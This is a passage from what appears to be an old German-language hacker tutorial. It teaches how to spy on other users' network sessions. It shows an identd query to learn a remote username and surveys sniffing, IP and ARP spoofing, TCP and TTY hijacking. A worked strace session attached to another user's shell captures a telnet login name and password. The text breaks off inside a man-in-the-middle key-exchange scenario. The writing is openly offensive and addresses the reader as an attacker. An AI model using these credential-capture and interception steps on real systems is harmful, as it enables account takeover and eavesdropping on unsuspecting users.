+&lt; unix&nbsp; 2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SOCK_STREAM&nbsp;&nbsp;&nbsp;&nbsp; CONNECTED&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /dev/log
+&lt; unix&nbsp; 2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SOCK_STREAM&nbsp;&nbsp;&nbsp;&nbsp; CONNECTED
+&lt; unix&nbsp; 2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ ACC ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SOCK_STREAM&nbsp;&nbsp;&nbsp;&nbsp; LISTENING&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /dev/printer
+&lt; unix&nbsp; 2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SOCK_STREAM&nbsp;&nbsp;&nbsp;&nbsp; CONNECTED&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /dev/log
+&lt; unix&nbsp; 2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SOCK_STREAM&nbsp;&nbsp;&nbsp;&nbsp; CONNECTED
+&lt; unix&nbsp; 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ ACC ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SOCK_STREAM&nbsp;&nbsp;&nbsp;&nbsp; LISTENING&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /dev/log</pre>
+Die aktiven Unix Domain Sockets interessieren hier nicht; von Interesse
+ist nur...
+<pre>&lt; Active Internet connections
+&lt; Proto&nbsp;&nbsp;&nbsp; Recv-Q Send-Q&nbsp; Local Address&nbsp;&nbsp;&nbsp; Foreign Address&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (State)
+&lt; User
+&lt; victim
+&lt; tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; localhost:1032&nbsp;&nbsp; host.account.edu:telnet&nbsp;&nbsp;&nbsp; ESTABLISHED</pre>
+... hier kannst du sehen, dass der User "victim" eine Verbindung vom Port
+1032 des lokalen Hosts zum Telnet-Port (23, siehe File <font color="#33FF33">/etc/services</font>)
+von "host.account.edu" (der Hostname wird bei Ueberlaenge abgeschnitten;
+du kannst dir mit der Option "-n" auch die IP-Adresse anzeigen lassen)
+aufgebaut hat. Jetzt weist du genug um ein kleines "Authentifikationsprogram"
+(<b>identd</b>) fuer deine Zwecke zu misbrauchen. Kurz was zur eigentlichen
+Verwendung von
+<table>
+<tr>
+<td><b>identd</b>:&nbsp;</td>
+
+<td><b>identd</b> wird von <b>V8 Sendmail</b> dazu benutzt um gefaelschte
+E-Mails zu entschaerfen, indem <b>sendmail identd</b> befragt welcher User
+gerade eine Verbindung zu ihm aufgebaut hat. (Das Format fuer <b>identd</b>:
+Server/Remote-Port, Client/Local-Port)&nbsp;</td>
+</tr>
+</table>
+Los geht's! Bau eine TCP Verbindung zum Port 113 (hier lauscht <b>identd</b>)
+von "host.account.edu" auf.
+<pre>> telnet host.account.edu 113
+&lt; Trying 127.0.0.1...
+&lt; Connected to host.account.edu.
+&lt; Escape character is '^]'.
+> 23, 1032
+&lt; 23 , 1032 : USERID : UNIX : hvictim
+> Connection closed by foreign host.</pre>
+Jupp, da is' es "hvictim".
+<p>Falls der Typ <b>rlogin</b> oder <b>rsh</b> benutzt, dann sieh' dir
+mal die Prozess-Liste an, <b>ps auw | grep victim</b> fuer BSD Derivate
+und <b>ps -ef | grep victim</b> fuer SysV (AT&amp;T) Unix. Von Interesse
+fuer uns ist hier die '-l' Option der Befehle, damit gibt man den Usernamen
+auf dem Remote Host an (dasselbe gilt auch fuer <i>SecureShell</i> - <b>ssh</b>).
+Wenn du zwar die eben genannten Client-Programme in der Prozessliste siehst,
+aber die '-l' Option fehlt, dann sind die Usernamen auf beiden Rechnern
+gleich.
+<p>Desweiteren kannst du, wenn du den Source Code von <b>telnet</b> bzw.
+<b>telnetd</b>
+fuer das OS des lokalen Rechners hast, den Code so veraendern, dass die
+Account Informationen fuer ausgehende bzw. eingehende Verbindungen aufgezeichnet
+werden.
+<p>Die effektivste und auch einfachste Methode ist einen <i>Ethernet-Sniffer</i>
+zu installieren. Der Sniffer setzt die Netzkarte in den <i>Promiscuous
+Mode</i> und kann so alle Pakete, die sich in seiner Collision Domain befinden,
+aufzeichnen. Am Besten siehst du dir mal den Code und die Docu.s von 'nem
+Sniffer an und spielst etwas damit herum.
+<br>Das Sniffen funktioniert nicht bei <i>ATM</i>- und bei <i>10BaseT</i>/<i>100BaseT</i>-Netzen
+(mit intelligentem Switch - naja, aber auch hier gibt es Mittel und Wege
+*evilG*)... und bei <i>FDDI</i>- und <i>Tokenring</i>-Netzen geht's nur
+teilweise.
+<p>Die Methode mit dem Sniffer ist eine passive Attacke. Aktive Angriffe
+wie <i>(Blind-) IP Spoofing</i>, <i>TCP Hijacking</i>... sind etwas komplizierter
+und ich werde sie hier nur kurz erleutern.
+<br>&nbsp;
+<table BORDER >
+<tr>
+<th>Methode&nbsp;</th>
+
+<th>Beschreibung&nbsp;</th>
+</tr>
+
+<tr>
+<td>Blind IP-Spoofing&nbsp;</td>
+
+<td>Hierbei benutzt man eine falsche IP Source Adresse und versucht eine
+TCP Verbindung aufzubauen.&nbsp;
+<br>Es wird der 'Trusted Host' Mechanismus der BSD &acute;r&acute;-Dienste
+(meistens <b>rlogind</b>) ausgenutzt, dieser 'Sicherheits'-Mechanismus
+erlaubt Zugriff anhand der IP Source Adresse, es wird kein Passwort benoetigt
+(sollte das Sniffen von Passwoertern verhindern).&nbsp;
+<br>Die grosse Kunst bei dieser Form der Attacke besteht darin die TCP
+Sequencenummer (s. RFC 793) richtig zu raten (da man die IP Src. gefaelscht
+hat bekommt man die TCP Seq# des entfernten Hosts nicht zu Gesicht; es
+sei denn, man benutzt die IP Src. Adresse eines Hosts, der sich in der
+selben Collision Domain befindet).&nbsp;
+<br>Bei alten Systemen ist das "Raten" relativ einfach (64K Rule) aber
+bei neuen Systemen ist es nahezu unmoeglich, da sie ihre TCP Seq# random
+(naja, haeufig ist der Algorithmus selten wirklich random, fuehrt hier
+aber mal wieder zu weit) erstellen.&nbsp;</td>
+</tr>
+
+<tr>
+<td>Non-Blind IP-Spoofing&nbsp;</td>
+
+<td>Der Vorteil dieser Attacke ist, dass man im Gegensatz zur 'blinden'
+Version die TCP Seq# und die Daten sieht. Ein wieterer Vorteil ist, dass
+mehrere Moeglichkeiten existieren.&nbsp;
+<ol>
+<li>
+IP Source Routing + Alias Interface</li>
+
+<br>Diese Methode is sehr einfach zu realisieren, es werden einfach alle
+Router, die das Packet passieren soll im IP Header als zusaetzliche Option
+angegeben...&nbsp;
+<br>Tja, aber das Dumme ist, dass der <b>rlogind </b>ueberprueft ob zusaetzliche
+Optionen im IP Header gesetzt sind, und wenn dem so ist, dann wird das
+Packet irgnoriert und eine Logmessage an <b>syslogd </b>uebergeben (jedenfalls
+wird es in der BSD Version gemacht und ich denke SysV macht es auch).&nbsp;
+<br>Zu allem Ueberfluss droppen mittlerweile die meisten Router IP Packets
+mit der Source-Routing Option.
+<li>
+Der gespoofte/zu attackierte Host befindet sich in der selben Collision
+Domain wie dein Host. Somit kannst du alle Packete sehen indem du deine
+Ethernetkarte in den Promisc. Mode schaltest (s. Sniffer).</li>
+
+<li>
+Du hast den ISP des Netzes gehackt, an dem der gespoofte/attackierte Host
+haengt. Es kann (generell) wie zuvor verfahren werden.&nbsp;</li>
+
+<li>
+Oder ARP Reply Spoofing ist sehr einfach und kompfortabel...&nbsp;</li>
+
+<br>Du erzaehltst dem zu hackenden Rechner einfach, dass die gespoofte
+IP zu deiner Hardware/Ethernet-Adresse gehoert, indem du das IP/HW-Paar
+mit Hilfe einer ARP Message in seinem ARP Cache eintragen laesst.&nbsp;
+<br>Ist leider mal wieder nur auf Collision Domains beschraenkt.&nbsp;
+<li>
+Die Route zwischen gepsooftem Host und attackiertem Host geht ueber 'deinen'
+Router.</li>
+
+<br>Das Schoenste ist natuerlich, wenn der Router eine Unix-Maschine ist
+auf der du root-Rechte besitzt und die Route per default ueber deinen Router
+laeuft. Naja, meistens ist es keine Unix-Maschine sondern ein Cisco, 3Com,
+Ascend, Livingston PM oder sonstwas und du must die Route erst ueber &acute;deinen&acute;
+Router redirecten (spoofe EGP/RIP Messages, oder vielleicht (wenn 'dein'
+Netz und das zuattakierende Netz direkt am selben Backbone haengen) ICMP
+Redirect Messages)&nbsp;</ol>
+</td>
+</tr>
+
+<tr>
+<td>TCP Hijacking&nbsp;</td>
+
+<td>Hierbei geht es darum eine bestehende TCP-Verbindung zu uebernehmen
+.&nbsp;
+<br>Dabei ergibt sich das gleiche Problem wie beim Non-Blind IP-Spoofing:
+man muss irgendwie in die Route der beiden Rechner kommen um die TCP Seq#
+mitzulesen.&nbsp;
+<br>Wenn man die Verbindung uebernommen hat kann man z.B. Shell-Commands
+in den Datenstrom einfuehgen, die dann auf dem entfernten Host ausgefuehrt
+werden.&nbsp;</td>
+</tr>
+</table>
+
+<p>Bei den IP-Spoof Attacken, muss darauf geachtet werden, dass der Host,
+dessen IP Adresse man spooft, nicht auf die Pakete des gefoolten Hosts
+antworten kann (hierzu benutzt man eine <i>DoS (Denial-of-Service) Attacke</i>),
+denn die Antwort (der TCP Stack generiert ein TCP RST Packet, da er nichts
+mit den empfangenden Paketen anfangen kann) wuerde den TCP Stack des attackierten
+Rechners dazu bringen die TCP Connection sofort zu beenden... und wer will
+das schon?
+<p>Drei "Sniffer"-Techniken erlauben es sogar verschluesselte Verbindungen
+(z.B. mit <i>SSH</i>) im Klartext aufzuzeichnen (bzw. Daten einzugeben).
+Dabei handelt es sich um <i>TTY-Hijacking,</i> <i>Process
+</i>(bzw.
+<i>Systemcall</i>)
+<i>Tracing
+</i>und
+die <i>Man-in-the-Middle (MIM) Attack</i>. Die ersten beiden Verfahren
+setzen den root Zugriff auf einem der Endsysteme voraus.
+<p>Beim <i>TTY-Hijacking </i>gibt es die verschiedensten Arten.
+<ul>
+<li>
+Ein einfacher 'ioctl()'-Aufruf (siehe dazu den Source Code von<b> </b><a href="http://www.thc.org">Smeagol
+(s. thc-uht1.tgz)</a> ) erlaubt es zeichenweise Daten in den TTY-Stream
+einzugeben (aber nicht auszulesen).</li>
+
+<br>Das Schoene an dieser Methode ist, dass man nicht unbedingt root-Rechte
+benoetigt. SEHR alte Systeme checken die Zugriffserlaubnis fuer Specialfiles
+anhand der r/w/x-Perms des Filesystems und nicht mit Hilfe des Kernels.
+SunOS hat einen Bug, der es erlaubt selbst non-root Usern einen Filedescriptor
+fuer Specialfiles zu erhalten.
+<li>
+Man kann die Shell eines Users durch einen <i>PTY</i>-Wrapper ersetzen
+(<i>PTY</i> = Pseudo-Terminal-Type), dadurch kann man alle Ein- und Ausgaben
+mitlesen.</li>
+
+<li>
+Einfuehgen von <i>LKM</i>s (Loadable Kernelmodules) erlaubt das Mitschneiden
+von Ein-/Ausgaben und die Eingabe von eigenen Daten durch veraendern von
+STREAMS</li>
+
+<li>
+Durch das Verbiegen von Systemcalls (aehnlich dem Verbiegen von DOS Interrupts
+in der Intr-Vektortabelle, aber wesentlich einfacher) koennen Eingaben
+aufgezeichnet werden.</li>
+</ul>
+Ok, kommen wir zum Tracen von Systemcalls.
+<br>Es wird eigentlich benutzt um Programme zu debuggen. Man kann den Aufruf
+von Systemcalls (und Signals) incl. Parametern verfolgen. Das coole ist,
+dass viele Unix-Derivate ueber dieses Feature und den entsprechenden Tools
+verfuehgen.
+<br>Unter Linux heisst dieses Programm <b>strace</b> (SunOS: <b>trace</b>,
+Solaris: <b>truss</b>, IRIX: <b>par</b>).
+<p>Ok, als erstes muessen wir uns ein Opfer aussuchen, d.h. die Shell eines
+Users (oder natuerlich auch eine bereits bestehende Verbindung mit <b>telnet</b>,
+<b>rlogin,
+ssh</b>...). Dazu benutzen wir <b>ps</b>.
+<pre>> ps
+&lt;&nbsp;&nbsp;&nbsp;&nbsp; PID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TTY&nbsp;&nbsp;&nbsp;&nbsp; STAT&nbsp;&nbsp;&nbsp; TIME&nbsp;&nbsp;&nbsp; COMMAND
+&lt;&nbsp;&nbsp;&nbsp;&nbsp; 69&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; v04&nbsp;&nbsp;&nbsp;&nbsp; SW&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0:00&nbsp;&nbsp;&nbsp; (agetty)
+&lt;&nbsp;&nbsp;&nbsp;&nbsp; 70&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; v05&nbsp;&nbsp;&nbsp;&nbsp; SW&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0:00&nbsp;&nbsp;&nbsp; (agetty)
+&lt;&nbsp;&nbsp;&nbsp;&nbsp; 257&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; v06&nbsp;&nbsp;&nbsp;&nbsp; SW&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0:00&nbsp;&nbsp;&nbsp; (agetty)
+&lt;&nbsp;&nbsp;&nbsp;&nbsp; 599&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; v02&nbsp;&nbsp;&nbsp;&nbsp; S&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0:00&nbsp;&nbsp;&nbsp; -bash
+&lt;&nbsp;&nbsp;&nbsp;&nbsp; 707&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; v03&nbsp;&nbsp;&nbsp;&nbsp; S&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0:00&nbsp;&nbsp;&nbsp; -bash
+&lt;&nbsp;&nbsp;&nbsp;&nbsp; 744&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; v02&nbsp;&nbsp;&nbsp;&nbsp; R&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0:00&nbsp;&nbsp;&nbsp; ps</pre>
+So, wir nehmen uns mal die <b>bash</b> mit der PID 707 vor. Wir rufen <b>strace</b>
+mit der Option '-f' auf um auch die Child-Prozesse der <b>bash</b>, wie
+z.B. <b>telnet</b>, zutracen. Eine grosse Menge der Ausgaben von <b>strace</b>
+habe ich herausgeschnitten um die Lesbarkeit zu verbessern.
+<pre>> strace -f -p 707 2>&amp;1 | egrep "read|recv|write|send|exec|socket|connect"
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Process 707 attached - interrupt to quit
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; read(0, "t", 1) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; write(2, "t", 1) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; read(0, "e", 1) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; write(2, "e", 1) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; read(0, "l", 1) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; write(2, "l", 1) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; read(0, "n", 1) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; write(2, "n", 1) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; read(0, "e", 1) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; write(2, "e", 1) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; read(0, "t", 1) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; write(2, "t", 1) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; read(0, " ", 1) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; write(2, " ", 1) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; read(0, "d", 1) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; write(2, "d", 1) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; read(0, "o", 1) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; write(2, "o", 1) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; read(0, "o", 1) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; write(2, "o", 1) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; read(0, "\r", 1) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; write(2, "\n", 1) = 1</pre>
+Hier koennen wir sehen wie der User <b>telnet doo</b> aufruft. Mit &acute;read(..)&acute;
+werden die Usereingaben gelesen und mit &acute;write(..)&acute; zum Terminal
+des Users geschrieben.
+<pre>&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: execve("/bin/telnet", "telnet", "doo", env:["ignoreeof=10",&nbsp; [pid 772]:</pre>
+Hier sehen wir nochmal genauer welcher Child-Prozess aufgerufen wurde.
+<pre>&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; socket(PF_INET, STREAM, IPPROTO_IP) = 3
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: connect(3, AF_INET(23, 10.0.0.1), 16) = 0</pre>
+Der Socket wird erzeugt und die Verbindung (IP Adresse und Port sind gut
+sichtbar) wird aufgebaut.
+<pre>&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: write(1, "Connected to doo.the-haze.org.\n", 32) = 32
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: write(1, "Escape character is '^]'.\n", 26) = 26</pre>
+Der uebliche telnet-Kram wird dem User angezeigt.
+<pre>&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: recv(3, "\ff\fb\1\r\nLinux 1.1.59 (doo.the-haze".., 1024, 0) = 49
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: write(1, "\r\nLinux 1.1.59 (doo.the-haze.or".., 46) = 46</pre>
+Das Welcome-Banner des Remote Hosts wird empfangen und an den User weitergegeben.
+<pre>&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: recv(3, "\ff\f2\r\ndoo login: ", 1024, 0) = 15
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: write(1, "\r\ndoo login: ", 13) = 13</pre>
+Die Login-Aufforderung.
+<pre>&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: read(0, "t", 1024) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: send(3, "t", 1, 0) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: recv(3, "t", 1024, 0) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: write(1, "t", 1) = 1</pre>
+Der ertse Buchstabe des Loginnamens wird eingelesen (&acute;read(..)&acute;),
+and den fernen Rechner gesendet (&acute;send(..)&acute;), das Echo empfangen
+(&acute;recv(..)&acute;) und zu dem User gegeben (&acute;write(..)&acute;).
+<pre>&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: read(0, "i", 1024) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: send(3, "i", 1, 0) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: recv(3, "i", 1024, 0) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: write(1, "i", 1) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: read(0, "c", 1024) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: send(3, "c", 1, 0) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: recv(3, "c", 1024, 0) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: write(1, "c", 1) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: read(0, "k", 1024) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: send(3, "k", 1, 0) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: recv(3, "k", 1024, 0) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: write(1, "k", 1) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: read(0, "\r", 1024) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: send(3, "\r\0", 2, 0) = 2</pre>
+Der Loginname ist "tick".
+<pre>&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: recv(3, "\r\nPassword: ", 1024, 0) = 12
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: write(1, "\r\nPassword: ", 12) = 12</pre>
+Der Passwort-Prompt.
+<pre>&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: read(0, "T", 1024) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: send(3, "T", 1, 0) = 1</pre>
+Zum Einlesen des Passwortes sind nur &acute;read(..)&acute; und &acute;send(..)&acute;
+noetig, da es bei Unix Maschinen ueblich ist das Passwort verdeckt einzulesen.
+<pre>&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: read(0, "E", 1024) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: send(3, "E", 1, 0) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: read(0, "S", 1024) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: send(3, "S", 1, 0) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: read(0, "T", 1024) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: send(3, "T", 1, 0) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: read(0, "S", 1024) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: send(3, "S", 1, 0) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: read(0, "T", 1024) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: send(3, "T", 1, 0) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: read(0, "R", 1024) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: send(3, "R", 1, 0) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: read(0, "A", 1024) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: send(3, "A", 1, 0) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: read(0, "C", 1024) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: send(3, "C", 1, 0) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: read(0, "E", 1024) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: send(3, "E", 1, 0) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: read(0, "\r", 1024) = 1
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: send(3, "\r\0", 2, 0) = 2
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: recv(3, "\r\0\r\n", 1024, 0) = 4
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: write(1, "\r\r\n", 3) = 3</pre>
+Sein Passwort ist "TESTSTRACE".
+<pre>&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: recv(3, "Last login: Mon Sep 22 15:58:52 ".., 1024, 0) = 48
+&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [pid 772]: write(1, "Last login: Mon Sep 22 15:58:52 ".., 48) = 48</pre>
+Die Lastlogin-Message, das Einloggen war also erfolgreich. Was wollen wir
+mehr?
+<br>&nbsp;
+<p>Kommen wir nun zur <i>MIM Attack</i>.
+<br>Eine <i>MIM Attack</i> haengt stark von dem Protokol fuer den Schluesselaustausch,
+von der zugrundeliegenden Netzwerkarchitektur, vom Routing und so weiter
+ab.
+<br>Ich werde mal ein kleines Szenario darstellen bei dem ein asymmetrischer
+(Public-Key) Kryptoalgorithmus verwendet wird. Die technischen Feinheiten
+sollen uns hier mal nicht interessieren.
+<br>Nehmen wir an, dass sich ein BKA Beamter (Harald) mit einem BSI Angestellten
+(Jochen) ueber die neusten Entwicklungen von und in der <b><font color="#3366FF">THC</font></b>-Crew
+unterhalten will. ;)
+<br>Zur Kommunikation wird ein <b>talk</b>-Derivat verwendet, welches die
+Daten encrypted ueber ein Computernetzwerk sendet. Desweiteren ist es die
+erste Kommunikation, sodass sie erst noch ihre Public-Keys austauschen
+muessen.
+<br>Unser Angreifer (TICK) sitz irgendwo zwischen den beiden. Nein, nicht
+'irgendwo'... er muss sich einen Platz aussuchen, den die Pakete auf jeden
+Fall passieren muessen (z.B. ein Router), oder er klinkt sich direkt ins
+Netzwerk ein, wenn er physikalischen Zugriff (z.B. bei einem Backbone Betreiber
+oder im lokalen Netz von Jochen oder Harald) hat, oder er manipuliert den
+<i>DNS
+Tree</i>, oder veraendert das Routing mit Hilfe von <i>RIP,</i> oder, oder,
+oder. Der Angreifer muss in der Lage sein Pakete abfangen, veraendern und
+weitersenden zu koennen; die original Pakete duerfen nicht den jeweiligen
+Kommunikationspartner erreichen.
+<br>So. Lasst das Spiel beginnen!
+<ul>
+<li>
+Jochen wartet auf die Verbindung von Harald</li>
+
+<li>
+Harald sendet seine Chat-Anfrage an Jochen</li>
+
+<li>
+die Software von Jochen und Harald etablieren jetzt die Verbindung</li>
+
+<li>
+TICK wird auf diese Aktion natuerlich aufmerksam</li>
+
+<li>
+wenn Harald seinen Public-Key an Jochen schickt, faengt TICK ihn ab und
+sendet stattdessen seinen eigenen Public-Key an Jochen und behauptet er
+kommt von Harald</li>
+
+<li>
+Jochen empfaengt TICK's Public-Key und denkt er kommt von Harald</li>
+
+<li>
+Jochen seinerseits sendet seinen Public-Key an Harald</li>
+
+<li>
